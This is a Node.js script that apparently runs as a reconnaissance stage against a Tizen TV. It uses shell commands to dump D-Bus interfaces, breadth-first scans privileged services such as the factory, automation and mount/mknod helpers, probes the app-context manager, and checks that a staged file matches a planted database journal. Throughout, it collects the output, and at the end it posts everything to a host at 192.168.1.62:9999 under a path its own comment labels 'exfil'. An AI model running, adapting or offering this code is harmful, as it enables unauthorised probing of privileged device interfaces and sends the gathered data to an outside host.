"use strict";

/* p67: raw XML dumps + wide service scans
   A. raw introspect (no filter): webappservice paths, litewebappservice paths,
      appctxmgr full (arg names!)
   B. BFS all-methods scans: factory-service, automation-service,
      com.safe.ps_mount/mknod/umount, deviced, registerdevice
   C. app_ctxmgr_get_context i=0,1,2 (read-only probe)
   D. verify DST/LIVE md5
   exfil /p67info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var R = { ts: new Date().toISOString(), probe: 'p67', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p67info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function parseNodes(text) {
  var nodes = [];
  var re = /node name=['"]([^'"]+)['"]/g;
  var m;
  while ((m = re.exec(String(text))) !== null) {
    if (nodes.indexOf(m[1]) < 0) nodes.push(m[1]);
  }
  return nodes;
}

function parseMethods(text) {
  var out = [];
  var mre = /<method name=['"]([^'"]+)['"]>/g;
  var mm;
  while ((mm = mre.exec(String(text))) !== null) {
    if (out.indexOf(mm[1]) < 0) out.push(mm[1]);
  }
  return out;
}

function deepScan(name, rootPath, maxCalls, wantedRe) {
  var found = [];
  var visited = {};
  var queue = [{ path: rootPath }];
  var calls = 0;
  while (queue.length > 0 && calls < maxCalls) {
    var p = queue.shift();
    calls++;
    if (visited[p]) continue;
    visited[p] = true;
    var out = run('dbus-send --system --print-reply --dest=' + name + ' ' + p + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -150', 30000, 6000);
    if (out.indexOf('Error') >= 0) continue;
    var methods = parseMethods(out);
    if (methods.length > 0) {
      var matched = [];
      for (var i = 0; i < methods.length; i++) {
        if (wantedRe.test(methods[i])) matched.push(methods[i]);
      }
      if (matched.length > 0) found.push(p + ': ' + matched.join(', '));
    }
    var nodes = parseNodes(out);
    for (var n = 0; n < nodes.length; n++) {
      var child = p === '/' ? '/' + nodes[n] : p + '/' + nodes[n];
      if (!visited[child]) queue.push(child);
    }
  }
  return { found: found, calls: calls, paths: Object.keys(visited) };
}

function main() {
  /* ---------- A. raw XML dumps ---------- */
  R.results.a1_webapp_root = run('dbus-send --system --print-reply --dest=org.tizen.tv.webappservice.server / org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 8000);
  R.results.a2_webapp_base = run('dbus-send --system --print-reply --dest=org.tizen.tv.webappservice.server /org/tizen/tv/webappservice org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 8000);
  R.results.a3_webapp_server = run('dbus-send --system --print-reply --dest=org.tizen.tv.webappservice.server /org/tizen/tv/webappservice/server org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 8000);
  R.results.a4_lite_base = run('dbus-send --system --print-reply --dest=org.tizen.tv.litewebappservice.server /org/tizen/tv/litewebappservice org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 8000);
  R.results.a5_lite_server = run('dbus-send --system --print-reply --dest=org.tizen.tv.litewebappservice.server /org/tizen/tv/litewebappservice/server org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 8000);
  R.results.a6_appctxmgr = run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr /org/tizen/tv/appfw/appctxmgr org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 12000);

  /* ---------- B. wide scans ---------- */
  R.results.b1_factory = JSON.stringify(deepScan('org.tizen.tv.factory-service', '/', 25, /.*/));
  R.results.b2_automation = JSON.stringify(deepScan('org.tizen.tv.automation-service', '/', 25, /.*/));
  R.results.b3_ps_mount = JSON.stringify(deepScan('com.safe.ps_mount', '/', 25, /.*/));
  R.results.b4_ps_mknod = JSON.stringify(deepScan('com.safe.ps_mknod', '/', 25, /.*/));
  R.results.b5_ps_umount = JSON.stringify(deepScan('com.safe.ps_umount', '/', 25, /.*/));
  R.results.b6_deviced = JSON.stringify(deepScan('org.tizen.system.deviced', '/', 25, /.*/));
  R.results.b7_register = JSON.stringify(deepScan('org.tizen.registerdevice', '/', 25, /.*/));

  /* ---------- C. appctxmgr read-only probe ---------- */
  R.results.c1_ctx0 = run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr --type=method_call /org/tizen/tv/appfw/appctxmgr org.tizen.tv.appfw.appctxmgr.app_ctxmgr_get_context int32:0 2>&1 | head -20', 30000);
  R.results.c2_ctx1 = run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr --type=method_call /org/tizen/tv/appfw/appctxmgr org.tizen.tv.appfw.appctxmgr.app_ctxmgr_get_context int32:1 2>&1 | head -20', 30000);
  R.results.c3_ctx2 = run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr --type=method_call /org/tizen/tv/appfw/appctxmgr org.tizen.tv.appfw.appctxmgr.app_ctxmgr_get_context int32:2 2>&1 | head -20', 30000);

  /* ---------- D. verify ---------- */
  R.results.d_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1', 20000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
